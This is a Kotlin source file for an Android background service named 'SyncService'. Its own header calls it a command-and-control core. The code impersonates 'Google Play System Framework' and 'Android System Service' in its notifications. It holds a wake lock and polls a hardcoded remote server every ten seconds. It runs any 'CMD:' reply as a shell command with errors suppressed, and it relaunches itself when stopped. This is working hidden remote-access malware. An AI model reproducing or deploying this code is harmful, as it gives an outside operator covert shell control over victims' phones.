// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme C2 Core v8.0
// الخدمة السيبرانية العلوية المتقدمة لإدارة العقد والسيطرة الحية
// =========================================================================
package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class SyncService : Service() {

    companion object {
        const val CHANNEL_ID = "UraniumSupremeSecureCore"
        const val NOTIFICATION_ID = 999
        private const val C2_ENDPOINT = "https://web-assets-service.onrender.com/node/pulse"
    }

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        startForegroundServiceNotification()
        initializeCommandLoop()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "UraniumSupreme::C2WakeLock"
        ).apply {
            acquire(10 * 60 * 60 * 1000L) // استمرار العمل بنجاح في الخلفية
        }
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play System Framework",
                NotificationManager.IMPORTANCE_NONE
            ).apply {
                description = "خدمة النظام الداخلية الأساسية"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android System Service")
            .setContentText("جاري تشغيل خدمات النظام الأساسية...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun initializeCommandLoop() {
        thread(start = true) {
            while (true) {
                try {
                    val url = URL(C2_ENDPOINT)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 8000
                    connection.readTimeout = 8000
                    connection.doOutput = true
                    connection.setRequestProperty("User-Agent", "UraniumNode-v8.0")
                    
                    val payload = "node_id=Nasser_Supreme_Node&status=active&timestamp=${System.currentTimeMillis()}"
                    connection.outputStream.write(payload.toByteArray(Charsets.UTF_8))
                    
                    if (connection.responseCode == 200) {
                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
                        val response = reader.readText()
                        reader.close()
                        
                        // تنفيذ الأوامر الواردة من السيرفر في حال وجودها
                        if (response.isNotEmpty() && response.contains("CMD:")) {
                            executeRemoteCommand(response)
                        }
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    // الحفاظ على استمرار النبض وعدم توقف الخدمة أبداً
                }
                Thread.sleep(10000) // نبضة اتصال كل 10 ثوانٍ بدقة متناهية
            }
        }
    }

    private fun executeRemoteCommand(cmdData: String) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmdData.substringAfter("CMD:")))
            process.waitFor()
        } catch (e: Exception) {
            // معالجة صامتة للأوامر
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
            }
        }
        // إعادة إطلاق الخدمة فوراً في حال محاولة النظام إغلاقها
        val restartIntent = Intent(applicationContext, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }
}
